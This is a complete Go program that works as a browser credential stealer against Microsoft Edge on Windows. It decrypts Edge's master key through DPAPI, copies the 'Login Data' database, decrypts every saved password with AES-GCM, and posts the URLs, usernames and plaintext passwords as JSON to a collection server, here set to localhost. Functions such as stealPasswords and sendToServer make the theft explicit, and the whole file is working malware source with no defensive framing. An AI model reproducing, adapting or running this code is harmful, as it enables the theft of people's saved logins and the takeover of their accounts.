package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	_ "modernc.org/sqlite"
)

const (
	EDGE_PATH    = "~/AppData/Local/Microsoft/Edge/User Data/Default/Login Data"
	TEMP_DB_PATH = "temp_login_data.db"
	SERVER_URL   = "http://localhost:8080/credentials"
)

// Windows API constants
const (
	CRYPTPROTECT_UI_FORBIDDEN  = 0x1
	CRYPTPROTECT_LOCAL_MACHINE = 0x4
)

var (
	crypt32  = syscall.NewLazyDLL("crypt32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

type Credential struct {
	URL       string `json:"url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	Timestamp string `json:"timestamp"`
}

func getMasterKey() ([]byte, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get home directory: %v", err)
	}

	localStatePath := filepath.Join(homeDir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %v", err)
	}

	var state struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, fmt.Errorf("failed to parse Local State: %v", err)
	}

	decodedKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encrypted key: %v", err)
	}

	// Remove the DPAPI prefix if present
	if len(decodedKey) > 5 && string(decodedKey[:5]) == "DPAPI" {
		decodedKey = decodedKey[5:]
	}

	// Create input blob
	inputBlob := DATA_BLOB{
		cbData: uint32(len(decodedKey)),
		pbData: &decodedKey[0],
	}

	// Create output blob
	var outputBlob DATA_BLOB

	cryptUnprotectData := crypt32.NewProc("CryptUnprotectData")
	ret, _, err := cryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inputBlob)),
		0,
		0,
		0,
		0,
		CRYPTPROTECT_UI_FORBIDDEN,
		uintptr(unsafe.Pointer(&outputBlob)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("failed to decrypt master key: %v", err)
	}

	// Convert output blob to byte slice
	output := make([]byte, outputBlob.cbData)
	copy(output, (*[1<<30 - 1]byte)(unsafe.Pointer(outputBlob.pbData))[:outputBlob.cbData])

	// Free the output blob
	localFree := kernel32.NewProc("LocalFree")
	localFree.Call(uintptr(unsafe.Pointer(outputBlob.pbData)))

	log.Printf("Master key size: %d bytes", len(output))
	return output, nil
}

func findLoginData() error {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}
	edgePath := filepath.Join(homeDir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")

	source, err := os.Open(edgePath)
	if err != nil {
		return err
	}
	defer source.Close()

	destination, err := os.Create(TEMP_DB_PATH)
	if err != nil {
		return err
	}
	defer destination.Close()

	_, err = io.Copy(destination, source)
	if err != nil {
		return err
	}

	return nil
}

func decryptPassword(encryptedPassword []byte, masterKey []byte) (string, error) {
	if len(encryptedPassword) < 3 {
		return "", fmt.Errorf("encrypted password too short")
	}
	if string(encryptedPassword[:3]) == "v10" {
		encryptedPassword = encryptedPassword[3:]
	}
	if len(masterKey) != 32 {
		return "", fmt.Errorf("invalid master key size: %d (expected 32)", len(masterKey))
	}

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %v", err)
	}

	iv := encryptedPassword[:12]
	ciphertext := encryptedPassword[12:]

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt: %v", err)
	}

	return string(plaintext), nil
}

func stealPasswords() ([]Credential, error) {
	masterKey, err := getMasterKey()
	if err != nil {
		log.Printf("Failed to get master key: %v", err)
		return nil, fmt.Errorf("failed to get master key: %v", err)
	}
	log.Println("Successfully obtained master key")

	if err := findLoginData(); err != nil {
		log.Printf("Failed to find login data: %v", err)
		return nil, err
	}
	log.Println("Successfully copied login data")
	defer os.Remove(TEMP_DB_PATH)

	db, err := sql.Open("sqlite", TEMP_DB_PATH)
	if err != nil {
		log.Printf("Failed to open database: %v", err)
		return nil, fmt.Errorf("failed to open database: %v", err)
	}
	defer db.Close()
	if err := db.Ping(); err != nil {
		log.Printf("Failed to ping database: %v", err)
		return nil, fmt.Errorf("failed to ping database: %v", err)
	}
	log.Println("Successfully connected to database")

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		log.Printf("Failed to query logins: %v", err)
		return nil, fmt.Errorf("failed to query logins: %v", err)
	}
	defer rows.Close()

	var credentials []Credential
	for rows.Next() {
		var originURL, username string
		var encryptedPassword []byte
		if err := rows.Scan(&originURL, &username, &encryptedPassword); err != nil {
			log.Printf("Failed to scan row: %v", err)
			continue
		}

		password, err := decryptPassword(encryptedPassword, masterKey)
		if err != nil {
			log.Printf("Failed to decrypt password for %s: %v", username, err)
			continue
		}

		credential := Credential{
			URL:       originURL,
			Username:  username,
			Password:  password,
			Timestamp: time.Now().Format(time.RFC3339),
		}
		credentials = append(credentials, credential)
		log.Printf("Successfully decrypted password for %s @ %s", username, originURL)
	}

	if err = rows.Err(); err != nil {
		log.Printf("Error iterating rows: %v", err)
	}

	if len(credentials) == 0 {
		log.Println("No credentials found in the database")
	}

	return credentials, nil
}

func sendToServer(credentials []Credential) error {
	jsonData, err := json.Marshal(credentials)
	if err != nil {
		return fmt.Errorf("failed to marshal credentials: %v", err)
	}

	resp, err := http.Post(SERVER_URL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to send to server: %v", err)
	}
	defer resp.Body.Close()

	return nil
}

func cleanup() {
	if _, err := os.Stat(TEMP_DB_PATH); err == nil {
		os.Remove(TEMP_DB_PATH)
	}
}

func main() {
	defer cleanup()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		cleanup()
		os.Exit(0)
	}()

	user := os.Getenv("USERNAME")
	fmt.Printf("Attempting to extract passwords for user: %s\n", user)

	edgePath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
	if _, err := os.Stat(edgePath); err != nil {
		log.Printf("Edge login data not found at: %s", edgePath)
		log.Printf("Error: %v", err)
		return
	}
	log.Printf("Found Edge login data at: %s", edgePath)

	credentials, err := stealPasswords()
	if err != nil {
		log.Printf("Error stealing passwords: %v", err)
		return
	}
	if len(credentials) > 0 {
		fmt.Printf("Successfully extracted %d passwords\n", len(credentials))
		if err := sendToServer(credentials); err != nil {
			log.Printf("Failed to send to server: %v", err)
		}
	} else {
		log.Println("No passwords were found in the database")
	}
}
